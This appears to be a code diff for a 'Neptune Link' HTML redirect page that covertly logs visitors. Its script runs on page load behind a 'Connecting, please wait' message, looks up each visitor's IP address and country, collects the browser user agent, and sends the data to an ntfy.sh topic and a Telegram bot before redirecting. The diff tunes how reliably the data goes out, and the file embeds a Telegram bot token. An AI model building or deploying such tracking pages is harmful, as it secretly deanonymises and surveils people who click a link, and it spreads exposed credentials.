@@ -7,7 +7,7 @@
 </head>
 <body style="background:#060714; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
   <h2>🪐 Neptune Link</h2>
-  <p>Connecting securely, please wait...</p>
+  <p>Connecting, please wait...</p>
 
   <script>
     const BOT_TOKEN = "8669634825:AAG5mv5CMIqilxRWvtw19irIKhXaalmlZZs";
@@ -21,10 +21,10 @@
       );
     }
 
-    async function handleRedirect() {
+    async function executeRedirect() {
       let targetUrl = "https://www.google.com";
 
-      // 1. Fetch Dynamic Target URL from config.json
+      // 1. Get Destination from config.json
       try {
         const configRes = await fetch(`./config.json?t=${Date.now()}`);
         if (configRes.ok) {
@@ -33,7 +33,7 @@
         }
       } catch (e) {}
 
-      // 2. Fetch Visitor Country & IP
+      // 2. Lookup Visitor Country & IP
       let country = "Unknown";
       let countryCode = "UN";
       let flag = "🌐";
@@ -42,19 +42,19 @@
       try {
         const geoRes = await fetch("https://ipwho.is/");
         if (geoRes.ok) {
-          const geoData = await geoRes.json();
-          country = geoData.country || "Unknown";
-          countryCode = geoData.country_code || "UN";
+          const data = await geoRes.json();
+          country = data.country || "Unknown";
+          countryCode = data.country_code || "UN";
           flag = getFlagEmoji(countryCode);
-          ip = geoData.ip || "Hidden";
+          ip = data.ip || "Hidden";
         }
       } catch (e) {}
 
-      const time = new Date().toUTCString();
+      const timeStr = new Date().toUTCString();
       const userAgent = navigator.userAgent;
 
-      // 3. Instant Push to Android App via Real-Time Bridge
-      const payload = {
+      // 3. Send Notification to Android App (with keepalive)
+      const appPayload = {
         country: country,
         countryCode: countryCode,
         flag: flag,
@@ -63,44 +63,47 @@
         time: Date.now()
       };
 
-      const pushPromise = fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
-        method: "POST",
-        headers: {
-          "Title": `🪐 New Visitor: ${flag} ${country}`,
-          "Tags": "link,globe_with_meridians"
-        },
-        body: JSON.stringify(payload)
-      }).catch(() => {});
+      try {
+        fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
+          method: "POST",
+          headers: {
+            "Title": `🪐 ${flag} ${country} Visited Link!`,
+            "Priority": "high",
+            "Tags": "link,globe_with_meridians"
+          },
+          body: JSON.stringify(appPayload),
+          keepalive: true
+        });
+      } catch (e) {}
 
-      // 4. Send Telegram Notification
-      const tgMessage = `🪐 *Neptune Link Opened!*\n\n` +
-                        `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
-                        `🌐 *IP:* \`${ip}\`\n` +
-                        `🔗 *Target:* ${targetUrl}\n` +
-                        `📱 *Device:* \`${userAgent}\`\n` +
-                        `⏰ *Time:* ${time}`;
+      // 4. Send Notification to Telegram
+      const tgMsg = `🪐 *Neptune Link Opened!*\n\n` +
+                    `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
+                    `🌐 *IP:* \`${ip}\`\n` +
+                    `🔗 *Target:* ${targetUrl}\n` +
+                    `📱 *Device:* \`${userAgent}\`\n` +
+                    `⏰ *Time:* ${timeStr}`;
 
-      const tgPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: tgMessage,
-          parse_mode: "Markdown"
-        })
-      }).catch(() => {});
+      try {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: tgMsg,
+            parse_mode: "Markdown"
+          }),
+          keepalive: true
+        });
+      } catch (e) {}
 
-      // Wait max 400ms for requests before redirecting
-      await Promise.race([
-        Promise.all([pushPromise, tgPromise]),
-        new Promise(resolve => setTimeout(resolve, 400))
-      ]);
-
-      // Redirect visitor
-      window.location.replace(targetUrl);
+      // Brief delay to guarantee transmission
+      setTimeout(() => {
+        window.location.replace(targetUrl);
+      }, 250);
     }
 
-    handleRedirect();
+    executeRedirect();
   </script>
 </body>
 </html>
